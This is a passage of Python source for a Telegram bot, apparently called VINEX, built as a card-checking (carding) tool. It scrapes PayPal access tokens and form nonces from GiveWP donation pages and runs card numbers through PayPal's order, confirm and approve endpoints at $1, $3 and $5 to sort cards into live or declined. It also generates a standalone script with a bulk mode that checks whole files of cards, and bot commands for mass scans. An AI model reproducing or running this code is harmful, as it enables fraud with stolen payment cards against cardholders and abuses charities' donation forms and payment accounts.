            for m in re.finditer(r'\b(A21[A-Za-z0-9+/=_-]{40,})\b', c):
                self._add_candidate(m.group(1), 'A21')
            for m in re.finditer(
                r'\b(eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)\b', c
            ):
                try:
                    parts = m.group(1).split('.')
                    if len(parts) >= 2:
                        padded = parts[1] + '=' * (-len(parts[1]) % 4)
                        payload = json.loads(base64.urlsafe_b64decode(padded))
                        if 'accessToken' in payload:
                            self._add_candidate(payload['accessToken'], 'jwt')
                except Exception:
                    pass
            if not self.client_id:
                for p in [
                    r'client-id=["\']([A-Za-z0-9_-]{20,})["\']',
                    r'"clientId"\s*:\s*"([A-Za-z0-9_-]{20,})"',
                ]:
                    m = re.search(p, c, re.I)
                    if m:
                        self.client_id = m.group(1)
                        break
            return len(self.token_candidates) > 0
        except Exception:
            return False

    def _validate_token(self, token, timeout=8):
        if not token or len(token) < 20:
            return False
        try:
            r = self.r.get(
                'https://api-m.paypal.com/v1/identity/oauth2/userinfo?schema=paypalv1.1',
                headers={'Authorization': f'Bearer {token}',
                         'Content-Type': 'application/json'},
                timeout=timeout,
            )
            if r.status_code in (200, 403, 422):
                return True
            if r.status_code == 401:
                return False
        except Exception:
            return len(token) > 50
        return False

    def _pick_valid_token(self):
        if not self.token_candidates:
            return False
        def prio(c):
            s = c['source'].lower()
            if 'a21' in s:
                return 0
            if 'direct' in s:
                return 1
            if 'jwt' in s:
                return 2
            if 'b64' in s:
                return 3
            return 4
        for c in sorted(self.token_candidates, key=prio):
            if self._validate_token(c['token']):
                self.au = c['token']
                self.token_verified = True
                return True
        return False

    def _try_ajax_client_token(self):
        if not self.ajax_url or not self.id_form2:
            return False
        for action in ['give_paypal_commerce_get_client_token', 'get_client_token']:
            try:
                payload = {
                    'action': action,
                    'form-id': self.id_form2,
                    'give-form-hash': self.nonce or '',
                    'give-form-id-prefix': self.id_form1 or f'{self.id_form2}-1',
                }
                r = self._safe_post(
                    self.ajax_url, data=payload,
                    headers={'user-agent': self.uu.random,
                             'x-requested-with': 'XMLHttpRequest',
                             'referer': self.page_url},
                    timeout=8,
                )
                if r and r.status_code == 200 and r.text:
                    try:
                        j = r.json()
                        token = None
                        if isinstance(j.get('data'), str):
                            token = j['data']
                        elif isinstance(j.get('data'), dict):
                            d = j['data']
                            token = d.get('client_token') or d.get('token') or d.get('access_token')
                        if not token:
                            token = (j.get('client_token') or j.get('token')
                                     or j.get('access_token'))
                        if token and len(token) > 20:
                            try:
                                padded = token + '=' * (-len(token) % 4)
                                dec = base64.b64decode(padded).decode('utf-8', errors='ignore')
                                tm = re.search(r'"accessToken"\s*:\s*"([^"]+)"', dec)
                                if tm:
                                    self._add_candidate(tm.group(1), f'ajax-b64:{action}')
                                    continue
                            except Exception:
                                pass
                            self._add_candidate(token, f'ajax:{action}')
                    except Exception:
                        pass
            except Exception:
                continue
        return len(self.token_candidates) > 0

    def _try_ajax_nonce(self):
        try:
            if not self.ajax_url:
                self.ajax_url = f'https://{self.url}/wp-admin/admin-ajax.php'
            if not self.id_form2:
                return False
            for action in ['give_get_form_nonce', 'give_donation_form_nonce']:
                r = self._safe_post(
                    self.ajax_url,
                    data={'action': action, 'form_id': self.id_form2},
                    headers={'user-agent': self.uu.random,
                             'x-requested-with': 'XMLHttpRequest'},
                    timeout=6,
                )
                if r and r.status_code == 200 and r.text:
                    try:
                        j = r.json()
                        if 'data' in j and isinstance(j['data'], str) and len(j['data']) >= 6:
                            self.nonce = j['data']
                            return True
                        if 'nonce' in j:
                            self.nonce = j['nonce']
                            return True
                    except Exception:
                        pass
        except Exception:
            pass
        return False

    def _detect_gateway_type(self):
        try:
            c = self.all_content
            if 'braintreegateway.com' in c and 'data-client-token' in c:
                self.gateway_type = 'braintree'
            elif 'paypal.com/sdk/js' in c and 'client-id=' in c:
                self.gateway_type = 'paypal_sdk'
            elif 'give_paypal_commerce' in c:
                self.gateway_type = 'givewp_paypal'
            elif 'paypal' in c.lower():
                self.gateway_type = 'paypal_unknown'
            else:
                self.gateway_type = 'unknown'
        except Exception:
            self.gateway_type = 'unknown'

    def _refresh_nonce(self):
        try:
            r = self._safe_get(self.page_url, timeout=15)
            if not r or r.status_code != 200:
                return False
            html = r.text
            self.page_html = html
            self.all_content = html
            m = re.search(r'name="give-form-hash"\s+value="([^"]+)"', html)
            if m:
                self.nonce = m.group(1)
            m = re.search(r'name="give-form-id"\s+value="(\d+)"', html)
            if m:
                self.id_form2 = m.group(1)
            m = re.search(r'name="give-form-id-prefix"\s+value="([^"]+)"', html)
            if m:
                self.id_form1 = m.group(1)
            return bool(self.nonce)
        except Exception:
            return False

    def _autofill_required_fields(self, form_data):
        try:
            for name, info in self.form_fields.items():
                if name in form_data:
                    continue
                if not info.get('required'):
                    continue
                if name.startswith(('give-form-', 'give_')):
                    continue
                if name in ('give-amount', 'give_first', 'give_last',
                            'give_email', 'give-gateway', 'payment-mode',
                            'give-price-id', 'give_agree_to_terms',
                            'give_terms_agreement'):
                    continue
                if 'prefill' in info:
                    form_data[name] = info['prefill']
                    continue
                ft = info.get('type', '')
                opts = [o for o in info.get('options', []) if is_valid_option(o)]
                nl = name.lower()
                if ft in ('select', 'radio'):
                    if not opts:
                        continue
                    form_data[name] = opts[0]
                elif ft == 'checkbox':
                    form_data[name] = opts[0] if opts else 'on'
                elif ft == 'email':
                    form_data[name] = self.email
                elif ft == 'number':
                    form_data[name] = '1'
                elif ft == 'tel':
                    form_data[name] = '1234567890'
                elif ft == 'date':
                    form_data[name] = '1990-01-01'
                else:
                    if 'first' in nl:
                        form_data[name] = random.choice(FIRST_NAMES)
                    elif 'last' in nl:
                        form_data[name] = random.choice(LAST_NAMES)
                    elif 'name' in nl:
                        form_data[name] = f'{random.choice(FIRST_NAMES)} {random.choice(LAST_NAMES)}'
                    elif 'email' in nl:
                        form_data[name] = self.email
                    elif any(k in nl for k in ('phone', 'mobile', 'tel')):
                        form_data[name] = '1234567890'
                    elif any(k in nl for k in ('address', 'street')):
                        form_data[name] = '123 Main St'
                    elif 'city' in nl:
                        form_data[name] = 'New York'
                    elif any(k in nl for k in ('zip', 'postal')):
                        form_data[name] = '10001'
                    elif 'state' in nl:
                        form_data[name] = 'NY'
                    elif 'country' in nl:
                        form_data[name] = 'US'
                    elif 'nric' in nl or 'fin' in nl:
                        form_data[name] = 'S1234567A'
                    elif 'amount' in nl:
                        form_data[name] = self.donation
                    else:
                        form_data[name] = 'Test'
        except Exception:
            pass
        return form_data

    def Key(self):
        try:
            if not self.page_url or 'invalid.local' in self.page_url:
                return False
            self._warmup_session()
            if not self._fetch_page():
                return False
            self._deep_js_analysis()
            self._extract_basic()
            self._extract_all_form_fields()
            self._extract_tokens_ultimate()

            if self.token_candidates and self._pick_valid_token():
                self.auth_method = 'token'
            else:
                self._load_iframes()
                self._deep_js_analysis()
                self._extract_basic()
                self._extract_tokens_ultimate()
                if self.token_candidates and self._pick_valid_token():
                    self.auth_method = 'token'

            if not self.au:
                self._load_all_js()
                self._deep_js_analysis()
                self._extract_tokens_ultimate()
                if self.token_candidates and self._pick_valid_token():
                    self.auth_method = 'token'

            if not self.au:
                if self._try_ajax_client_token() and self._pick_valid_token():
                    self.auth_method = 'ajax'

            if not self.nonce and self.id_form2:
                self._try_ajax_nonce()

            self._resolve_dropdown_options()
            self._resolve_special_fields()

            if not self.id_form1 and self.id_form2:
                self.id_form1 = f'{self.id_form2}-1'
            if not self.ajax_url:
                self.ajax_url = f'https://{self.url}/wp-admin/admin-ajax.php'

            self._detect_gateway_type()
            return True
        except Exception:
            return False

    def _build_amounts(self, thorough=False):
        amounts = list(BASE_AMOUNTS)
        try:
            min_val = float(self.minimum)
            if min_val > 5.00 and min_val <= 500:
                m = f'{min_val:.2f}'
                if m not in amounts:
                    amounts.append(m)
        except Exception:
            pass
        return amounts

    def _build_price_ids(self):
        pids = []
        if self.current_price_id:
            pids.append(self.current_price_id)
        for pid, _ in (self.price_levels or []):
            if pid and pid not in pids:
                pids.append(pid)
        for p in ('custom', '3', '4', '1', '2', '5', '', None):
            if p not in pids:
                pids.append(p)
        return pids

    def _attempt_charge(self, n, mm, yy, cvc, amt):
        try:
            self.donation = amt
            expiry = f'20{yy}-{mm}'
            price_ids = self._build_price_ids()
            order_id = None
            last_create_err = None

            for pid in price_ids:
                try:
                    form_data = {
                        'give-form-id-prefix': self.id_form1 or '',
                        'give-form-id': self.id_form2 or '',
                        'give-form-hash': self.nonce or '',
                        'give-amount': amt,
                        'give-currency': self.currency,
                        'payment-mode': 'paypal-commerce',
                        'give_first': random.choice(FIRST_NAMES),
                        'give_last': random.choice(LAST_NAMES),
                        'give_email': self.email,
                        'give-gateway': 'paypal-commerce',
                        'give_agree_to_terms': 'on',
                        'give_terms_agreement': 'on',
                    }
                    if pid is not None:
                        form_data['give-price-id'] = pid
                    form_data = self._autofill_required_fields(form_data)
                    da = MultipartEncoder({
                        k: (None, str(v) if v is not None else '')
                        for k, v in form_data.items()
                    })
                    he = {
                        'content-type': da.content_type,
                        'user-agent': self.uu.random,
                        'x-requested-with': 'XMLHttpRequest',
                        'referer': self.page_url,
                        'origin': f'https://{self.url}',
                    }
                    try:
                        r3 = self.r.post(
                            self.ajax_url,
                            params={'action': 'give_paypal_commerce_create_order'},
                            headers=he, data=da, timeout=20,
                        )
                    except Exception as e:
                        last_create_err = f'NETWORK: {type(e).__name__}'
                        continue
                    body = r3.text or ''
                    if r3.status_code != 200:
                        last_create_err = f'HTTP_{r3.status_code}: {body[:150]}'
                        continue
                    try:
                        j = r3.json()
                    except Exception:
                        last_create_err = f'JSON_ERR: {body[:200]}'
                        continue
                    if isinstance(j, dict) and j.get('success') \
                       and isinstance(j.get('data'), dict) \
                       and j['data'].get('id'):
                        order_id = j['data']['id']
                        break
                    real = extract_response_text(body)
                    last_create_err = real or 'ORDER_CREATE_FAILED'
                except Exception:
                    last_create_err = 'EXC'
                    continue

            if not order_id:
                return None, last_create_err or 'ORDER_CREATE_FAILED'

            metadata = self.paypal or self.client_id or ''
            he4 = {
                'authorization': f'Bearer {self.au or ""}',
                'paypal-client-metadata-id': metadata,
                'content-type': 'application/json',
                'origin': f'https://{self.url}',
                'referer': f'https://{self.url}/',
                'user-agent': self.uu.random,
            }
            da3 = {
                'payment_source': {
                    'card': {
                        'number': n, 'expiry': expiry,
                        'security_code': cvc,
                        'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}},
                    },
                },
                'application_context': {'vault': False},
            }
            confirm_body = ''
            confirm_ok = False
            try:
                cr = self.r.post(
                    'https://cors.api.paypal.com/v2/checkout/orders/'
                    f'{order_id}/confirm-payment-source',
                    headers=he4, json=da3, timeout=20,
                )
                confirm_body = cr.text or ''
                confirm_ok = cr.status_code in (200, 201, 202, 422)
            except Exception:
                confirm_body = ''
                confirm_ok = False

            if confirm_ok and confirm_body:
                if is_card_decline(confirm_body):
                    return extract_response_text(confirm_body) or confirm_body[:200], confirm_body
                if is_auth_failure(confirm_body):
                    return 'AUTH_FAILURE_ON_CONFIRM', confirm_body

            approve_errors = []
            for pid in price_ids:
                try:
                    form_data = {
                        'give-form-id-prefix': self.id_form1 or '',
                        'give-form-id': self.id_form2 or '',
                        'give-form-hash': self.nonce or '',
                        'give-amount': amt,
                        'give-currency': self.currency,
                        'payment-mode': 'paypal-commerce',
                        'give_first': random.choice(FIRST_NAMES),
                        'give_last': random.choice(LAST_NAMES),
                        'give_email': self.email,
                        'give-gateway': 'paypal-commerce',
                        'give_agree_to_terms': 'on',
                        'give_terms_agreement': 'on',
                    }
                    if pid is not None:
                        form_data['give-price-id'] = pid
                    form_data = self._autofill_required_fields(form_data)
                    da4 = MultipartEncoder({
                        k: (None, str(v) if v is not None else '')
                        for k, v in form_data.items()
                    })
                    he5 = {
                        'content-type': da4.content_type,
                        'user-agent': self.uu.random,
                        'x-requested-with': 'XMLHttpRequest',
                        'referer': self.page_url,
                        'origin': f'https://{self.url}',
                    }
                    r5 = self.r.post(
                        self.ajax_url,
                        params={'action': 'give_paypal_commerce_approve_order',
                                'order': order_id},
                        headers=he5, data=da4, timeout=20,
                    )
                    text = (r5.text or '')
                    combined = text + confirm_body
                    lower = combined.lower()

                    if '"success":true' in lower and '"error"' not in lower:
                        return f'CHARGE {amt}$', combined

                    if is_card_decline(combined):
                        return extract_response_text(text) or extract_response_text(confirm_body) or combined[:200], combined
                    if is_auth_failure(combined):
                        return 'AUTH_FAILURE_ON_APPROVE', combined
                    raw = extract_response_text(text) or extract_response_text(confirm_body)
                    if raw and raw.strip():
                        approve_errors.append(raw)
                except Exception:
                    approve_errors.append('approve_exception')

            if approve_errors:
                return approve_errors[-1], ''
            if confirm_body.strip():
                return extract_response_text(confirm_body), confirm_body
            return 'APPROVE_NO_RESPONSE', ''
        except Exception as e:
            return None, f'FATAL_{type(e).__name__}'

    def Charge(self, ccx, thorough=False):
        try:
            if not ccx or not isinstance(ccx, str):
                return 'INVALID_CARD_FORMAT'
            ccx = ccx.strip().replace(' ', '')
            parts = re.split(r'[|:/]', ccx)
            if len(parts) < 4:
                return 'INVALID_CARD_FORMAT'
            n = re.sub(r'\D', '', parts[0])
            mm = re.sub(r'\D', '', parts[1]).zfill(2)
            yy = re.sub(r'\D', '', parts[2])
            cvc = re.sub(r'\D', '', parts[3])
            if len(yy) == 4 and yy.startswith('20'):
                yy = yy[2:]
            yy = yy.zfill(2)
            if len(n) < 13 or len(n) > 19:
                return 'INVALID_CARD_NUMBER'
            if len(mm) != 2 or not (1 <= int(mm) <= 12):
                return 'INVALID_EXPIRY_MONTH'
            if len(cvc) < 3 or len(cvc) > 4:
                return 'INVALID_CVV'

            if not self.ajax_url or 'invalid.local' in self.ajax_url:
                return 'INVALID_SITE'
            if not self.id_form2:
                return 'FORM_ERROR: give-form-id missing'

            if not self.nonce:
                self._try_ajax_nonce()
                if not self.nonce:
                    self._refresh_nonce()
                if not self.nonce:
                    return 'NONCE_MISSING'
            if not self.id_form1:
                self.id_form1 = f'{self.id_form2}-1'

            if not self.au:
                self._extract_tokens_ultimate()
                if not self._pick_valid_token():
                    if self._try_ajax_client_token():
                        self._pick_valid_token()

            amounts = self._build_amounts(thorough)
            all_results = []
            create_errors = []

            def _try_amounts(amt_list):
                for amt in amt_list:
                    try:
                        result, text = self._attempt_charge(n, mm, yy, cvc, amt)
                        if result and result.startswith('AUTH_FAILURE'):
                            create_errors.append((amt, 'AUTH_REFRESH'))
                        elif result:
                            all_results.append({'amount': amt, 'result': result, 'text': text})
                        elif not result:
                            create_errors.append((amt, text or 'unknown'))
                    except Exception:
                        create_errors.append((amt, 'EXC'))

            _try_amounts(amounts)

            if not all_results and any(e[1] == 'AUTH_REFRESH' for e in create_errors):
                self.token_candidates = []
                self.au = None
                self._refresh_nonce()
                self._extract_tokens_ultimate()
                if self._pick_valid_token():
                    create_errors = []
                    _try_amounts(amounts)

            if not all_results:
                if create_errors:
                    last_amt, last_err = create_errors[-1]
                    self.donation = last_amt
                    return last_err if last_err else 'ORDER_CREATE_FAILED'
                return 'NO_ATTEMPT'

            best = max(all_results, key=lambda x: score_result(x['result']))
            self.donation = best['amount']
            return normalize_result(best['result'])
        except Exception as e:
            return f'FATAL_{type(e).__name__}'

# ═════════════════════════════════════════════════════════════════
#  🌉 BRIDGE
# ═════════════════════════════════════════════════════════════════
def check_single_link(link, thorough=True):
    try:
        link = safe_url(link)
        if not link:
            return {'link': str(link)[:100] if link else 'Invalid',
                    'live': False, 'respons': 'BAD_URL',
                    'amount': '1.00', 'tester': None}
        tester = VinexTester(link)
        if not tester.Key():
            return {'link': link[:100], 'live': False,
                    'respons': 'FETCH_FAILED', 'amount': '1.00',
                    'tester': tester}
        result = tester.Charge(TEST_CARD, thorough=thorough)
        live = is_live_response(result) and not is_dead_response(result)
        return {'link': link[:100], 'live': live,
                'respons': str(result)[:300],
                'amount': tester.donation,
                'minimum': tester.minimum,
                'currency': tester.currency,
                'auth': tester.auth_method,
                'tester': tester}
    except Exception:
        return {'link': str(link)[:100] if link else 'Invalid',
                'live': False, 'respons': 'FATAL',
                'amount': '1.00', 'tester': None}

# ═════════════════════════════════════════════════════════════════
#  🎁 GATEWAY TEMPLATE (shortened — same as v20.1)
# ═════════════════════════════════════════════════════════════════
GATEWAY_TEMPLATE_STR = r'''#!/usr/bin/env python3
# VINEX Gateway v21
import requests, random, time, re, base64, json, os, sys
try:
    from fake_useragent import UserAgent
    _UU = UserAgent(fallback='Mozilla/5.0')
    def rand_ua():
        try: return _UU.random
        except: return 'Mozilla/5.0'
except Exception:
    def rand_ua(): return 'Mozilla/5.0'
from requests_toolbelt.multipart.encoder import MultipartEncoder
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PAGE_URL = "$page_url"
AJAX_URL = "$ajax_url"
ID_FORM1 = "$id_form1"
ID_FORM2 = "$id_form2"
NONCE = "$nonce"
ACCESS_TOKEN = "$access_token"
PAYPAL_META = "$paypal_meta"
CLIENT_ID = "$client_id"
CURRENCY = "$currency"
MINIMUM = "$minimum"
CURRENT_PID = "$current_pid"
PRICE_LEVELS = $price_levels_json
FORM_FIELDS = $form_fields_json
HOST = PAGE_URL.split('//')[-1].split('/')[0]
FIRST_NAMES = ['James', 'John', 'Robert', 'Michael']
LAST_NAMES = ['Smith', 'Johnson', 'Williams', 'Brown']
BASE_AMOUNTS = ['1.00', '3.00', '5.00']

def extract_response_text(body):
    if not body: return ''
    s = str(body).strip()
    if not s: return ''
    try:
        j = json.loads(s)
        if isinstance(j, dict):
            d = j.get('data')
            if isinstance(d, dict):
                det = d.get('details')
                if isinstance(det, list) and det and isinstance(det[0], dict):
                    for k in ('description', 'issue', 'reason'):
                        v = det[0].get(k)
                        if v and str(v).strip().lower() not in ('none', 'null', ''):
                            return str(v)[:300]
                for k in ('error', 'message', 'msg', 'reason', 'detail', 'description', 'name'):
                    v = d.get(k)
                    if v and str(v).strip().lower() not in ('none', 'null', 'false', ''):
                        return str(v)[:300]
            elif isinstance(d, str) and d.strip() and d.lower() not in ('none', 'null'):
                return d[:300]
            for k in ('error', 'message', 'msg', 'detail', 'reason', 'description'):
                v = j.get(k)
                if v and str(v).strip().lower() not in ('none', 'null', '', 'false'):
                    return str(v)[:300]
    except Exception: pass
    return s[:300]

_JUNK_PATTERNS = ['give-', 'screen-reader', 'give-label', 'give-required', 'give-where']
_JUNK_EXACT = {'true', 'false', 'none', 'null', 'selected', 'disabled', 'required'}
def is_valid_option(opt):
    if not opt or not isinstance(opt, str): return False
    o = opt.strip()
    if not o: return False
    lo = o.lower()
    if lo in _JUNK_EXACT: return False
    for pat in _JUNK_PATTERNS:
        if pat in lo: return False
    if len(o) > 60 or o.startswith(('{', '[', '<')): return False
    return True

CARD_DECLINES = [
    'INSTRUMENT_DECLINED', 'PAYER_CANNOT_PAY', 'ORDER_NOT_APPROVED',
    'Payer has not yet approved', 'Payer cannot pay', 'PAYMENT_DENIED',
    'DO_NOT_HONOR', 'INSUFFICIENT_FUNDS', 'CVV_FAILURE', 'CVV2_FAILURE',
    'INVALID_OR_RESTRICTED', 'SUSPECTED_FRAUD', 'ACCOUNT_CLOSED',
    'EXPIRED_CARD', 'CARD_EXPIRED', 'TRANSACTION_NOT_PERMITTED',
    'GENERIC_DECLINE', 'TRANSACTION_REFUSED', 'AUTHORIZATION_DENIED',
    'DECLINED',
]
def is_card_decline(t):
    if not t: return False
    up = str(t).upper()
    return any(p.upper() in up for p in CARD_DECLINES)

def luhn_check(cn):
    try:
        d = [int(x) for x in str(cn)]
        o = d[-1::-2]; e = d[-2::-2]
        tot = sum(o)
        for x in e: tot += sum([int(y) for y in str(x*2)])
        return tot % 10 == 0
    except Exception: return False

class PayPal:
    def __init__(self):
        self.email = "%s%s%d@gmail.com" % (random.choice(FIRST_NAMES), random.choice(LAST_NAMES), random.randint(100, 999))
        self.r = requests.Session()
        self.r.headers.update({'user-agent': rand_ua()})
        self.donation = "1.00"
        try:
            self.r.get('https://%s/' % HOST, timeout=15)
            time.sleep(0.2)
            self.r.get(PAGE_URL, timeout=20)
        except: pass

    def _autofill(self, fd):
        for name, info in FORM_FIELDS.items():
            if name in fd or not info.get("required") or name.startswith(("give-form-", "give_")): continue
            if "prefill" in info: fd[name] = info["prefill"]; continue
            ft = info.get("type", "")
            opts = [o for o in info.get("options", []) if is_valid_option(o)]
            if ft in ("select", "radio"):
                if not opts: continue
                fd[name] = opts[0]
            elif ft == "email": fd[name] = self.email
            else: fd[name] = "1234567890" if ft == "tel" else "Test"
        return fd

    def _create(self, amt, pid):
        try:
            fd = {"give-form-id-prefix": ID_FORM1, "give-form-id": ID_FORM2,
                  "give-form-hash": NONCE, "give-amount": amt, "give-currency": CURRENCY,
                  "payment-mode": "paypal-commerce", "give_first": random.choice(FIRST_NAMES),
                  "give_last": random.choice(LAST_NAMES), "give_email": self.email,
                  "give-gateway": "paypal-commerce", "give_agree_to_terms": "on"}
            if pid is not None: fd["give-price-id"] = pid
            fd = self._autofill(fd)
            da = MultipartEncoder({k: (None, str(v)) for k, v in fd.items()})
            r = self.r.post(AJAX_URL, params={"action": "give_paypal_commerce_create_order"},
                headers={"content-type": da.content_type, "x-requested-with": "XMLHttpRequest",
                         "referer": PAGE_URL, "origin": "https://" + HOST}, data=da, timeout=20)
            body = r.text or ''
            try: j = r.json()
            except: return None, "JSON_ERR: " + body[:200]
            if isinstance(j, dict) and j.get("success") and isinstance(j.get("data"), dict) and j["data"].get("id"):
                return j["data"]["id"], None
            return None, extract_response_text(body) or "CREATE_FAILED"
        except Exception as e: return None, "EXC_%s" % type(e).__name__

    def _confirm(self, oid, n, mm, yy, cvc):
        try:
            he = {"authorization": "Bearer " + (ACCESS_TOKEN or ""),
                  "paypal-client-metadata-id": PAYPAL_META or CLIENT_ID or "",
                  "content-type": "application/json",
                  "origin": "https://" + HOST, "referer": PAGE_URL}
            expiry = "20%s-%s" % (yy, mm)
            da = {"payment_source": {"card": {"number": n, "expiry": expiry, "security_code": cvc,
                  "attributes": {"verification": {"method": "SCA_WHEN_REQUIRED"}}}},
                  "application_context": {"vault": False}}
            cr = self.r.post("https://cors.api.paypal.com/v2/checkout/orders/" + oid + "/confirm-payment-source",
                headers=he, json=da, timeout=20)
            return cr.text or ""
        except: return ""

    def _approve(self, oid, amt, pid):
        try:
            fd = {"give-form-id-prefix": ID_FORM1, "give-form-id": ID_FORM2,
                  "give-form-hash": NONCE, "give-amount": amt, "give-currency": CURRENCY,
                  "payment-mode": "paypal-commerce", "give_first": random.choice(FIRST_NAMES),
                  "give_last": random.choice(LAST_NAMES), "give_email": self.email,
                  "give-gateway": "paypal-commerce", "give_agree_to_terms": "on"}
            if pid is not None: fd["give-price-id"] = pid
            fd = self._autofill(fd)
            da = MultipartEncoder({k: (None, str(v)) for k, v in fd.items()})
            r = self.r.post(AJAX_URL, params={"action": "give_paypal_commerce_approve_order", "order": oid},
                headers={"content-type": da.content_type, "x-requested-with": "XMLHttpRequest",
                         "referer": PAGE_URL, "origin": "https://" + HOST}, data=da, timeout=20)
            return r.text or ""
        except: return ""

    def _pids(self):
        pids = []
        if CURRENT_PID: pids.append(CURRENT_PID)
        for pid, _ in (PRICE_LEVELS or []):
            if pid and pid not in pids: pids.append(pid)
        for p in ("custom", "3", "4", "1", "2", "5", "", None):
            if p not in pids: pids.append(p)
        return pids

    def Charge(self, ccx):
        try:
            ccx = ccx.strip().replace(" ", "")
            parts = re.split(r"[|:/]", ccx)
            if len(parts) < 4: return "INVALID_CARD_FORMAT"
            n = re.sub(r"\D", "", parts[0]); mm = re.sub(r"\D", "", parts[1]).zfill(2)
            yy = re.sub(r"\D", "", parts[2]); cvc = re.sub(r"\D", "", parts[3])
            if len(yy) == 4 and yy.startswith("20"): yy = yy[2:]
            yy = yy.zfill(2)
            if not luhn_check(n): return "INVALID_CARD_NUMBER"
            pids = self._pids()
            amounts = list(BASE_AMOUNTS)
            errors = []
            best = None
            for amt in amounts:
                self.donation = amt
                oid = None; last = None
                for pid in pids:
                    o, e = self._create(amt, pid)
                    if o: oid = o; break
                    last = e
                if not oid:
                    if last: errors.append((amt, last))
                    continue
                conf = self._confirm(oid, n, mm, yy, cvc)
                cr = extract_response_text(conf)
                if cr and is_card_decline(cr): return cr
                for pid in pids:
                    t = self._approve(oid, amt, pid) + "\n" + conf
                    if '"success":true' in t.lower() and '"error"' not in t.lower():
                        return "CHARGE %s$" % amt
                    raw = extract_response_text(t) or extract_response_text(conf)
                    if raw and is_card_decline(raw) and not best:
                        best = raw
            if best: return best[:300]
            if errors:
                _, last = errors[-1]
                if last: return last[:300]
            return "ORDER_CREATE_FAILED"
        except Exception as e: return "FATAL_%s" % type(e).__name__

def single_check():
    print("\n--- Single ---")
    try:
        c = input("Card (num|mm|yy|cvc): ").strip()
        if not c: return
        p = PayPal(); print("→", p.Charge(c))
    except Exception as e: print("Err:", e)

def file_check():
    print("\n--- File ---")
    try:
        path = input("File: ").strip()
        if not os.path.exists(path): print("Not found"); return
        with open(path) as f: cards = [l.strip() for l in f if l.strip()]
        out = "vinex_%d.txt" % int(time.time())
        with open(out, "w") as fo:
            for i, c in enumerate(cards, 1):
                try:
                    p = PayPal(); r = p.Charge(c)
                    line = "%s => %s" % (c, r)
                    print("[%d/%d] %s" % (i, len(cards), line))
                    fo.write(line + "\n"); fo.flush()
                except: pass
        print("Saved:", out)
    except Exception as e: print("Err:", e)

def main():
    print("=" * 50)
    print("  VINEX Gateway v21 — 1→3→5$")
    print("  " + PAGE_URL)
    print("=" * 50)
    while True:
        try:
            c = input("\n[1] Single  [2] File  [0] Exit: ").strip()
            if c == "1": single_check()
            elif c == "2": file_check()
            elif c == "0": break
        except KeyboardInterrupt: break
        except: continue

if __name__ == "__main__":
    try: main()
    except: pass
'''

_GATEWAY_TEMPLATE = Template(GATEWAY_TEMPLATE_STR)

def generate_gateway_code(result, link, tester=None):
    link = link or 'https://invalid.local/'
    display_result = normalize_result(result)[:120]
    display_result = display_result.replace('\n', ' ').replace('\r', '')

    def g(attr, default=''):
        try:
            if tester and getattr(tester, attr, None):
                return getattr(tester, attr)
            return default
        except Exception:
            return default

    p = urlparse(link)
    host = p.netloc or 'invalid.local'
    price_levels = tester.price_levels if tester and tester.price_levels else []
    form_fields = tester.form_fields if tester and tester.form_fields else {}

    try:
        price_levels_json = repr(price_levels)
    except Exception:
        price_levels_json = '[]'
    try:
        form_fields_json = repr(form_fields)
    except Exception:
        form_fields_json = '{}'

    return _GATEWAY_TEMPLATE.safe_substitute(
        page_url=link,
        ajax_url=g('ajax_url') or f'https://{host}/wp-admin/admin-ajax.php',
        id_form1=g('id_form1'),
        id_form2=g('id_form2'),
        nonce=g('nonce'),
        access_token=g('au'),
        paypal_meta=g('paypal'),
        client_id=g('client_id'),
        currency=g('currency', 'USD'),
        minimum=g('minimum', '5.00'),
        current_pid=g('current_price_id'),
        auth_method=g('auth_method', 'none'),
        gateway_type=g('gateway_type', 'unknown'),
        price_levels_json=price_levels_json,
        form_fields_json=form_fields_json,
        display_result=display_result,
    )

# ═════════════════════════════════════════════════════════════════
#  🎭 BOT HANDLERS — VINEX STYLE
# ═════════════════════════════════════════════════════════════════
@bot.message_handler(commands=['start'])
def cmd_start(message):
    try:
        save_user(message.from_user.id)
        if is_blocked(message.from_user.id):
            safe_send_message(message.chat.id, '🚫 Blocked.')
            return
        uid = message.from_user.id
        name = message.from_user.first_name or 'User'
        text = (
            f'{vinex_header("Welcome aboard!")}\n\n'
            f'😎 <b>Hey {name}!</b>\n'
            f'🆔 <b>Your ID:</b> <code>{uid}</code>\n\n'
            f'🌟 <b>What I can do for you:</b>\n'
            f'  ⚡ <code>/paypal &lt;url&gt;</code> — single scan\n'
            f'  📦 <code>/mass</code> — bulk scan (send .txt)\n'
            f'  ♻️ <code>/resume</code> — continue last job\n'
            f'  🛑 <code>/stop</code> — halt running job\n'
            f'  🔬 <code>/diag &lt;url&gt;</code> — deep diagnostics\n'
            f'  📊 <code>/stats</code> — bot statistics\n'
            f'  💡 <code>/help</code> — full guide\n\n'
            f'🎯 <b>Mode:</b> <i>1$ → 3$ → 5$ progressive</i>\n'
            f'🎨 <b>Style:</b> <i>Bold • Precise • Playful</i>\n'
            f'━━━━━━━━━━━━━━━━━━━━━━━\n'
            f'💎 <b>Let\'s find some gems!</b>'
        )
        kb = types.InlineKeyboardMarkup(row_width=2)
        kb.add(
            vinex_btn('Stats', 'primary', callback_data='stats'),
            vinex_btn('Help', 'info', callback_data='help'),
        )
        kb.add(
            vinex_btn('Scan a URL', 'success', callback_data='howto_paypal'),
            vinex_btn('Stop', 'danger', callback_data='stop'),
        )
        safe_send_message(message.chat.id, text, reply_markup=kb)
    except Exception:
        log.exception('cmd_start')


@bot.message_handler(commands=['help'])
def cmd_help(message):
    try:
        text = (
            f'{vinex_header("The Manual")}\n\n'
            f'🔍 <b>Single Scan</b>\n'
            f'  <code>/paypal https://example.com/donate</code>\n'
            f'  ▸ Warmup → JS hunt → Token validate\n'
            f'  ▸ Charges: <b>$1 → $3 → $5</b>\n'
            f'  ▸ Real PayPal responses (no faking)\n'
            f'  ▸ Gateway file sent on LIVE\n\n'
            f'📦 <b>Bulk Scan</b>\n'
            f'  <code>/mass</code> → upload .txt (max 10MB)\n'
            f'  ▸ Each LIVE link = separate file\n'
            f'  ▸ Smart dedup (http/https/www/slash)\n'
            f'  ▸ Nonce auto-refresh every 50\n\n'
            f'🛑 <b>Control</b>\n'
            f'  <code>/stop</code> — graceful stop\n'
            f'  <code>/resume</code> — continue\n\n'
            f'🔬 <b>Diagnostics</b> (admin)\n'
            f'  <code>/diag URL</code> — full pipeline report\n\n'
